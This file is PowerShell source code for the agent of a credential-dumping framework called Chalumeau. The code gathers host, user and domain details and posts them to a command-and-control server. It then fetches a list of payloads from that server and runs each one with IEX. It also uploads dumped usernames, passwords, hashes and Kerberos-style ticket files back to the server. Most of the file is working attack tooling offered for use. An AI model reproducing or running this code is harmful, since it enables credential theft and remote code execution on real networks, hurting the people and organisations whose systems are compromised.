$GLOBAL:USERAGENT = "Chalumeau Agent"
$GLOBAL:GETKEYENDPOINT = "/get-key/"
$GLOBAL:SENDCREDSENDPOINT = "/send-credentials/"
$GLOBAL:SENDTICKETENDPOINT = "/send-ticket/"
$GLOBAL:GETPAYLOADSENDPOINT = "/get-payloads/"


try {
    $GLOBAL:WebClient = New-Object ("System.Net.WebClient");
    $GLOBAL:WebClient."Proxy" = [System.Net.WebProxy]::GetDefaultProxy();
    $GLOBAL:WebClient."UseDefaultCredentials" = ${true};
    $GLOBAL:WebClient.Headers.Add("User-Agent", $GLOBAL:USERAGENT);
    $GLOBAL:WebClient."Proxy"."Credentials" = [System.Net.CredentialCache]::DefaultNetworkCredentials;
} catch { 
    $_."EXCEPTION" | Out-File ("C:\programdata\chalumeau_error.txt") -Append; 
}

function ChalumeauHTTP {
    <#
    .DESCRIPTION
        base http agent
    #>
    Param(
        [String] $URL, 
        [String] $File, 
        [System.Collections.Specialized.NameValueCollection] $Data
    )
    try {
        if($File){
            $GLOBAL:WebClient.UploadFile($Url,"post", $File);
        }else{
            $GLOBAL:WebClient.UploadValues($Url,"post", $Data);
        }
    } catch { 
        $_."EXCEPTION" | Out-File ("C:\programdata\chalumeau_error.txt") -Append; 
    }
}

function ChalumeauSendCredentials {
    <#
    .SYNOPSIS
        ChalumeauSendCredentials
    .DESCRIPTION
        send Secrets to c2
    .PARAMETER Secret
        dumped password
    .PARAMETER source
        payload description
    .PARAMETER Username
        dumped username
    .PARAMETER IsClearText
        bool value if the Secret is cleartext or not
    .EXAMPLE
        ChalumeauSendCredentials -Secret $secret -Username $user -IsClearText 0 -source "My custom payload"
    #>
    Param(
        [String] $Secret, 
        [String] $source,
        [String] $Username,
        [bool] $IsClearText
    )
    $url = "$Global:ChalumeauServer$GLOBAL:SENDCREDSENDPOINT"
    $credstype = "HASH";
    if($IsClearText){
        $credstype = "NORMAL";
    }
    $data = New-Object System.Collections.Specialized.NameValueCollection;
    $data.Add("type", $credstype);
    $data.Add("username", $Username);
    $data.Add("password", $Secret);
    $data.Add("source", $source);
    ChalumeauHTTP -URL $url -Data $data
}
function ChalumeauSendTicket {
    Param(
        [String] $Ticket 
    )
    $url = "$Global:ChalumeauServer$GLOBAL:SENDTICKETENDPOINT"
    ChalumeauHTTP -File $Ticket -URL $url
}

function ChalumeauGetKey {
    <#
    .DESCRIPTION
        Get Auth key from the c2
    #>
    $data = New-Object System.Collections.Specialized.NameValueCollection;
    $localip = (
            Get-NetIPConfiguration |
            Where-Object {
                $_.IPv4DefaultGateway -ne $null -and
                $_.NetAdapter.Status -ne "Disconnected"
            }
        ).IPv4Address.IPAddress;
    $data.Add("host_name", $ENV:COMPUTERNAME);
    $data.Add("host_local_ip", $localip);
    $data.Add("host_username", $env:USERNAME);
    $data.Add("host_domain", $env:USERDOMAIN);
    $data.Add("host_arch", $env:PROCESSOR_ARCHITECTURE);
    $data.Add("domain_joined", ($env:computername -ne $env:userdomain));
    $url = "$Global:ChalumeauServer$GLOBAL:GETKEYENDPOINT";
    $response = $GLOBAL:WebClient.UploadValues($url ,"post", $data);
    $GLOBAL:ChalumeauKey = [System.Text.Encoding]::UTF8.GetString($response);
    $GLOBAL:WebClient.Headers.Add("ChalumeauKey", $GLOBAL:ChalumeauKey);

}

function ChalumeauGetPayloads {
    <#
    .DESCRIPTION
        Get Payloads List from the c2
    #>
    $PAYLOADS_u = @()
    $url = "$Global:ChalumeauServer$GLOBAL:GETPAYLOADSENDPOINT";
    $response = $GLOBAL:WebClient.UploadValues($url ,"post", (New-Object System.Collections.Specialized.NameValueCollection));
    $payloads = [System.Text.Encoding]::UTF8.GetString($response);
    Foreach ($i in ($payloads | ConvertFrom-Json | select -expand payloads))
    {
        $PAYLOADS_u += "$Global:ChalumeauServer$i"            
    }
    return $PAYLOADS_u
}


function Invoke-Chalumeau {
    <#
    .SYNOPSIS
        Invoke-Chalumeau
    .DESCRIPTION
        Dumping credentials  
    .PARAMETER ChalumeauServer
        the c2 server base url
    .EXAMPLE
        Invoke-Chalumeau -ChalumeauServer "http://192.168.1.20:8000"
    .NOTES
        https://github.com/cyberstruggle/chalumeau
    #>
    Param(
        [String] $ChalumeauServer
    )

    $Global:ChalumeauServer = $ChalumeauServer
    ChalumeauGetKey
    $payloads = ChalumeauGetPayloads
    foreach ($payload in $payloads){
        $response = $GLOBAL:WebClient.UploadValues($payload ,"post", (New-Object System.Collections.Specialized.NameValueCollection));
        $execcode = [System.Text.Encoding]::UTF8.GetString($response);
        try {
            IEX($execcode)  
        }
        catch {
            write-host $_
        }
    }
    write-host "[+] Done Check the server !"
}


